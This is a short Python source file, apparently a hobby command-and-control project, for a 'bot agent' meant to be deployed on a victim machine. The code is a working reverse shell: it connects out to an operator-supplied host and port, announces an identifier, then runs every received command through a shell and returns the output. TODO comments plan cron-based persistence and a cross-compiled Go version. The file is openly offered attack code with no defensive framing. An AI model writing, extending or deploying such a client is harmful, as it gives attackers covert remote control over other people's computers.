"""

Author: Sunggwan Choi 

Description: Client.py is the bot agent that will be deployed to the victim 
machine, and create a established reverse shell connection back to the 
server.py. 

client.py is barely finished.

TODO: 
    - Create a persistence mechaism built into the codebase.

    - Bulid it in golang, for cross compilation 

"""



import socket
import subprocess 
import sys

# TODO Implement persistence through cronjob 
def persistence():
    pass


host = sys.argv[1]
port = int(sys.argv[2])

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sock.settimeout(1)

try:
    sock.connect((host, port))
    sock.settimeout(None)
except:
    sys.exit()

id = "Edub07_c1i3nt"
sock.send(id.encode())

while True:
    # Receiving command, turning into string 
    command = sock.recv(1024).decode().rstrip()

    if (command != ''):
        #print("[DEBUG] command = ", command)
        
        try: 
            result = subprocess.check_output(command, shell=True)

            sock.send(result)
        except Exception as err:
            continue
        
    elif not command:
        break

sock.close()

